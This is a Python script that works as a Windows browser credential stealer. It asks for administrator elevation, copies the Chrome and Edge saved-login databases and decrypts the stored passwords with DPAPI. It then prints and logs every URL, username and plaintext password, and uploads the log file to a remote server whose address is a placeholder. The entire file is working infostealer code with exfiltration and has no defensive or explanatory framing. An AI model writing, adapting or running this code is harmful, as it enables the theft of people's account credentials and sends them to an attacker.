import os
import sqlite3
import ctypes
import sys
import win32crypt
import shutil
import tempfile
import logging
import requests  # Added for HTTP requests

# Set up logging
script_dir = os.path.dirname(os.path.abspath(__file__))
log_file = os.path.join(script_dir, 'credential_extractor.log')
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s %(levelname)s: %(message)s')

def is_admin():
    """Check if the script is running with administrative privileges."""
    try:
        admin_status = ctypes.windll.shell32.IsUserAnAdmin()
        logging.debug(f"Admin status: {admin_status}")
        return admin_status
    except Exception as e:
        logging.error(f"Error checking admin status: {e}")
        return False

def run_as_admin():
    """Relaunch the script as an administrator if not already."""
    if not is_admin():
        try:
            logging.info("Attempting to elevate privileges.")
            # Re-run the script with admin rights
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, " ".join(sys.argv), None, 1
            )
            sys.exit()
        except Exception as e:
            logging.error(f"Failed to elevate privileges: {e}")
            sys.exit(1)

def decrypt_password(encrypted_password):
    """Decrypt the encrypted password using Windows DPAPI."""
    try:
        decrypted_password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
        logging.debug("Password decrypted successfully.")
        return decrypted_password.decode('utf-8')
    except Exception as e:
        logging.error(f"Error decrypting password: {e}")
        return ''

def copy_and_open_db(login_db_path):
    """Copy the database file to a temporary location and open it."""
    try:
        temp_dir = tempfile.mkdtemp()
        temp_db_path = os.path.join(temp_dir, "Login Data")
        shutil.copy2(login_db_path, temp_db_path)
        logging.debug(f"Copied database to {temp_db_path}")
        return sqlite3.connect(temp_db_path)
    except Exception as e:
        logging.error(f"Error copying and opening database: {e}")
        return None

def extract_chrome_data():
    """Extract saved credentials from Chrome."""
    logging.info("Extracting Chrome credentials...")
    profile_dir = os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default')
    login_db = os.path.join(profile_dir, 'Login Data')
    credentials = []

    if os.path.exists(login_db):
        conn = copy_and_open_db(login_db)
        if conn:
            cursor = conn.cursor()
            cursor.execute('SELECT origin_url, username_value, password_value FROM logins')

            for row in cursor.fetchall():
                password = decrypt_password(row[2])
                login_data = {
                    'url': row[0],
                    'username': row[1],
                    'password': password
                }
                credentials.append(login_data)

            conn.close()
    else:
        logging.warning("Chrome login database not found.")

    for entry in credentials:
        print(f"URL: {entry['url']}\nUsername: {entry['username']}\nPassword: {entry['password']}\n")
        logging.debug(f"Extracted credential: {entry}")

def extract_edge_data():
    """Extract saved credentials from Edge."""
    logging.info("Extracting Edge credentials...")
    profile_dir = os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Default')
    login_db = os.path.join(profile_dir, 'Login Data')
    credentials = []

    if os.path.exists(login_db):
        conn = copy_and_open_db(login_db)
        if conn:
            cursor = conn.cursor()
            cursor.execute('SELECT origin_url, username_value, password_value FROM logins')

            for row in cursor.fetchall():
                password = decrypt_password(row[2])
                login_data = {
                    'url': row[0],
                    'username': row[1],
                    'password': password
                }
                credentials.append(login_data)

            conn.close()
    else:
        logging.warning("Edge login database not found.")

    for entry in credentials:
        print(f"URL: {entry['url']}\nUsername: {entry['username']}\nPassword: {entry['password']}\n")
        logging.debug(f"Extracted credential: {entry}")

def send_log_to_server():
    """Send the log file to the remote server."""
    url = 'http://<your_server_ip>:5000/upload'  # Replace with your server IP and port
    files = {'file': open(log_file, 'rb')}
    
    try:
        response = requests.post(url, files=files)
        if response.status_code == 200:
            logging.info("Log file sent successfully to server.")
        else:
            logging.error(f"Failed to send log file. Status code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        logging.error(f"Error sending log file: {e}")

def main():
    """Main function to elevate privileges and extract credentials."""
    logging.info("Script started.")
    run_as_admin()
    logging.info("Running with elevated privileges.")

    extract_chrome_data()
    extract_edge_data()

    logging.info("Credential extraction completed.")
    send_log_to_server()  # Send log file to server after extraction

if __name__ == "__main__":
    main()
